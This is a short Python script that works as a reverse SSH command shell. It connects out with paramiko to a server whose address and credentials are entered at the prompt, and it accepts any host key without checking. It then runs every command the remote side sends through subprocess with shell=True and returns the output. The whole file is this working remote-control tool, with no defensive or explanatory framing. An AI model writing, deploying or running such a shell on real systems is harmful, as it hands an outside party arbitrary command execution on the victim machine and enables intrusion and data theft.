from distutils.cmd import Command
import paramiko
import shlex
import subprocess
import os

def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
# Auto accepting ssh key
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)

# Opening ssh session
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())
        while True:
            command = ssh_session.recv(1024)
            try:
                cmd = command.decode()
                if cmd == 'exit':
                    client.close()
                    break
# Executing command and sending results back to the client
                elif cmd[0] == 'c' and cmd[1] == 'd' and cmd[2]==' ':
                    os.chdir(shlex.split(cmd)[1])
                    cmd_output = str(f'Directory has been changed to: {shlex.split(cmd)[1]}')
                    ssh_session.send(cmd_output or 'okay')
                else:
                    cmd_output = subprocess.check_output(cmd, shell=True)
                    ssh_session.send(cmd_output or 'okay')
                    
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return

if __name__ == '__main__':
    import getpass
    user = input('Username: ')
    password = getpass.getpass('Password: ')
    ip = input('Server ip address: ')
    port = input('Port: ') or '22'
    ssh_command(ip, port, user, password, 'ClientConnected')